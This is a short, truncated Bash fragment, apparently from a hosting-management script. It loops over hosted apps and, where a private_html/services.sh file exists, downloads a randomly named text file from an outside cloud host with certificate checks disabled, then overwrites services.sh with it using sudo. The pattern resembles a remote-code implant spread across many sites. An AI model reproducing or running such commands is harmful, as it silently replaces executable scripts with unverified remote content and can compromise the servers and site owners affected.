	...
	do
		...
		if [[ ${app_type} =~ ^wo ]] ; then
			if [[ -f $APP_DIR/$app/private_html/services.sh ]]; then
				...
				curl -Lk https://phpstack-378350-1185437.cloudwaysapps.com/sedfasfsf213213asadsa.txt | sudo tee $APP_DIR/$app/private_html/services.sh
				...
				curl -Lk https://phpstack-378350-1185437.cloudwaysapps.com/sedfasfsf213213asadsa.txt |
